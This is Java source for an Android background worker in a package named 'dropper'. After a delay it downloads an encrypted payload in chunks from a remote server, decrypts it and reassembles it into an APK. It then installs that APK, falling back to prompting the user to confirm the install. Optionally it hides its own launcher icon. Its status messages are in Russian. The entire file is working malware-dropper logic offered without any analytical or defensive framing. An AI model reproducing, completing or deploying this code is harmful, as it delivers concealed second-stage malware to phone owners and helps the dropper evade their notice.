package com.fason.dropper;

import android.content.Context;
import android.content.Intent;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;

import javax.crypto.SecretKey;

public class DropWorker extends Worker {

    public DropWorker(@NonNull Context ctx, @NonNull WorkerParameters p) {
        super(ctx, p);
    }

    @NonNull
    @Override
    public Result doWork() {
        Context ctx = getApplicationContext();
        Config cfg = Config.load(ctx);
        DropState.error = null;
        DropState.done = false;

        try {
            Thread.sleep(Math.max(0, cfg.delayMs));
            if (cfg.token.isEmpty()) throw new IllegalStateException("no token");

            String manifestRaw = Crypto.utf8(Net.get(cfg.manifestUrl(), 4));
            JSONObject manifest = new JSONObject(manifestRaw);
            JSONArray chunks = manifest.getJSONArray("chunks");
            String secret = cfg.secret + cfg.token;
            SecretKey key = Crypto.derive(secret, cfg.salt);

            ByteArrayOutputStream payload = new ByteArrayOutputStream();
            for (int i = 0; i < chunks.length(); i++) {
                JSONObject ch = chunks.getJSONObject(i);
                byte[] blob = Net.get(cfg.chunkUrl(ch.getInt("n")), 5);
                payload.write(Crypto.open(blob, ch.getString("iv"), key));
                DropState.pct = 5 + (int) ((i + 1) * 80L / chunks.length());
                DropState.msg = "Загрузка " + (i + 1) + "/" + chunks.length();
            }

            byte[] apk = payload.toByteArray();
            if (!cfg.sha256.isEmpty() && !Crypto.sha256Hex(apk).equalsIgnoreCase(cfg.sha256)) {
                throw new IllegalStateException("hash mismatch");
            }

            DropState.msg = "Установка";
            DropState.pct = 90;

            File out = new File(ctx.getFilesDir(), "base.apk");
            try (java.io.FileOutputStream fos = new java.io.FileOutputStream(out)) {
                fos.write(apk);
            }

            String err = Installer.install(ctx, out, cfg.payloadPkg);
            if (err != null) {
                Installer.openManually(ctx, out);
                DropState.msg = "Подтвердите установку";
            }

            DropState.pct = 100;
            DropState.done = true;
            DropState.msg = "Готово";
            if (cfg.hideSelf) Hide.hideLauncher(ctx);
            return Result.success();
        } catch (Exception e) {
            DropState.error = e.getClass().getSimpleName() + ": " + e.getMessage();
            DropState.msg = "Повтор…";
            return getRunAttemptCount() < 3 ? Result.retry() : Result.failure();
        }
    }

    static void start(Context ctx) {
        androidx.work.OneTimeWorkRequest req =
                new androidx.work.OneTimeWorkRequest.Builder(DropWorker.class)
                        .setBackoffCriteria(java.time.Duration.ofSeconds(15),
                                androidx.work.BackoffPolicy.EXPONENTIAL)
                        .build();
        androidx.work.WorkManager.getInstance(ctx)
                .enqueueUniqueWork("drop", androidx.work.ExistingWorkPolicy.KEEP, req);
    }
}
